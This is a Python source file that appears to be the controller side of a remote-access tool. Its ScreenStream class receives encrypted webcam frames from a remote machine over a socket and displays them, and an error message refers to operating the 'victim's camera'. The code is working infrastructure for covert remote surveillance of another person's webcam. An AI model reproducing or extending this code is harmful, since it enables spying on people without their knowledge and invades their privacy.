import pickle
import socket
import struct
import time

import numpy as np
import cv2
from PIL import Image, ImageGrab, ImageFile
import win32api
ImageFile.LOAD_TRUNCATED_IMAGES = True



class ScreenStream:
    def __init__(self, piper_client):
        """
        initiate pygame attributes
        """
        self.symmetric_encryption = piper_client.symmetric_encryption
        self.piper_client = piper_client
        # self.udp_socket.settimeout(1)
        ImageGrab.grab().save('last_screenshot.png')
        # activate the pygame library .
        # initiate pygame and give permission
        # to use pygame's functionality.
        self.isStreaming = False


        # define the RGB value
        # for white colour
        self.white = (255, 255, 255)

        # assigning values to X and Y variable
        # pygame.init()
        # info = pygame.display.Info()  # You have to call this before pygame.display.set_mode()
        # self.screen_width, self.screen_height = info.current_w, info.current_h
        # self.display_surface = pygame.display.set_mode((self.screen_width, self.screen_height), pygame.RESIZABLE)
        # self.current_image = None
        # self.clock = pygame.time.Clock()
        # self.FPS = 15
        self.MAX_DGRAM = 20000

        # set the pygame window name
        #pygame.display.set_caption("Screen Stream")


    def recv_large_data(self):
        """
        this functions handles recieving a large amount of data (like images)
        so it recieves the required size of data and divides it into several times
        :param my_socket: the socket it receives through
        :return: the data received
        """
        size = self.piper_client.my_socket.recv(1024)
        # print("size recieving is: ", size)

        size = int(self.symmetric_encryption.decrypt(size).decode())
        # print("The image size is: ", size)
        self.piper_client.send("got".encode())
        # print("sent to server that i got the size")
        data = b''
        c = 0
        while size != 0:
            # print(size)
            packet_data = self.piper_client.my_socket.recv(1024)
            packet_len = len(packet_data)
            data += packet_data
            size -= packet_len
            c += 1
        # print("THE LARGE DATA I RECIEVED IS: ", data)
        # print("received data in " + str(c) + " seperate times.")
        #print('size: ', len(data), ' data: ', data)
        data = self.symmetric_encryption.decrypt(data)
        return data

    def run(self):
        self.isStreaming = True
        dat = b''
        escape_value = 27

        finished = False

        while not finished:
            # print("try to recv seg")
            data = self.recv_large_data()
            #print(data)
            if data == b'Could not use camera':
                print("Closing...")
                self.piper_client.send('quit'.encode())
                print("Sent to close...")
                cv2.destroyAllWindows()
                finished = True
                win32api.MessageBox(0, 'Could not operate victim\'s camera', 'Try again later')
            else:
                img = cv2.imdecode(np.fromstring(data, dtype=np.uint8), 1)
                cv2.imshow('Press ESC to exit', img)
                # print("show frame")
                # try:
                #     cv2.imshow('Press ESC to exit', img)
                # except:
                #     print("showing frame error")
                #     # break
                if cv2.waitKey(1) == escape_value:
                    print("Closing...")
                    self.piper_client.send('quit'.encode())
                    print("Sent to close...")
                    cv2.destroyAllWindows()
                    finished = True
                else:
                    self.piper_client.send('again'.encode())
                    # print('sent again')
                    dat = b''

        # self.piper_client.my_socket.settimeout(0.5)
        # self.piper_client.my_socket.recv(2**16)
        # self.piper_client.my_socket.settimeout(None)
        print('finished loop')
        self.isStreaming = False


def main():
    # sc = ScreenStream()
    # sc.run()
    pass

if __name__ == "__main__":
    main()
